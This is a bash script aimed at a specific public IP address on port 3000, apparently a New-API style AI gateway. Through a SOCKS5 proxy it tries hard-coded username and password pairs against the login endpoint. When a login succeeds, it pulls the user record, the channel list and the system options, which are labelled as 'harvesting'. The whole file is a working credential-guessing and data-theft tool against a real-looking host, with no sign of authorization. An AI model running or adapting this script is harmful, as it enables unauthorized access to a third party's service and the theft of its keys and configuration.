#!/usr/bin/env bash
# Guarded: only runs if probe found target 51.79.66.166:3000 SUCCEEDED via WARP.
cd "$(dirname "$0")"
ok=$(python3 - <<'PY'
import json
try:
    d=json.load(open("reachability.json"))
except Exception:
    print("no"); raise SystemExit
print("yes" if any(r["label"]=="TARGET" and r["port"]==3000 and r["state"]=="SUCCEEDED" for r in d) else "no")
PY
)
echo "TARGET3000_REACHABLE=$ok"
[ "$ok" != "yes" ] && { echo "skip login: target:3000 not reachable via WARP"; exit 0; }
PX="-x socks5h://127.0.0.1:40000"
U=http://51.79.66.166:3000
echo "--- /api/status ---"
curl -s -m 20 $PX -D - "$U/api/status" -o status.body | head -15; echo; echo "BODY:"; head -c 800 status.body; echo
for cred in 'hr_animation_test:HrNew440!' 'ceshi102203:12345678' 'ceshi102203:123456789' 'admin:12345678'; do
  u=${cred%%:*}; p=${cred#*:}
  echo "--- login $u ---"
  curl -s -m 25 $PX -c cj_$u -D - -o login.body -X POST "$U/api/user/login" \
    -H 'Content-Type: application/json' --data "{\"username\":\"$u\",\"password\":\"$p\"}" | head -12
  echo; head -c 500 login.body; echo
  echo "--- /api/user/self as $u ---"
  curl -s -m 20 $PX -b cj_$u -H "New-Api-User: 1" -o self.body -w 'http=%{http_code}\n' "$U/api/user/self"; head -c 500 self.body; echo
  python3 - "$u" <<'PY' || true
import sys,json
try:
    d=json.load(open("login.body"))
    print("LOGIN_JSON",sys.argv[1],"success=",d.get("success"),"msg=",d.get("message"))
    if d.get("success"):
        print("LOGIN_OK",sys.argv[1])
except Exception as e: print("login parse",e)
PY
  if grep -q '"success":true' login.body 2>/dev/null; then
     echo "=== authenticated as $u; harvesting ==="
     curl -s -m 25 $PX -b cj_$u -H "New-Api-User: 1" "$U/api/user/self" | head -c 1200; echo
     curl -s -m 25 $PX -b cj_$u -H "New-Api-User: 1" "$U/api/channel/?p=1&page_size=20" | head -c 4000; echo
     curl -s -m 25 $PX -b cj_$u -H "New-Api-User: 1" "$U/api/option/" | head -c 4000; echo
     break
  fi
done
